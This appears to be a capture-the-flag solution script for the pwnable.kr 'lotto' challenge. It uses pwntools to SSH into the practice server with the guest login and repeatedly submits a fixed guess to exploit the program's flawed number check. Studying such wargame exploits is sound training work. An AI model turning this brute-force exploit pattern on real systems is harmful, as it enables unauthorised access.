#!/usr/bin/python3
from pwn import *

s = ssh('lotto', 'pwnable.kr', 2222, 'guest')
p = s.process('./lotto')

while True:
    p.sendline('1')
    time.sleep(1)
    p.sendline('!!!!!!')
    time.sleep(1)

    rec = p.recv().decode('ascii')
    print(rec)

    if rec.find('bad luck') == -1:
        break
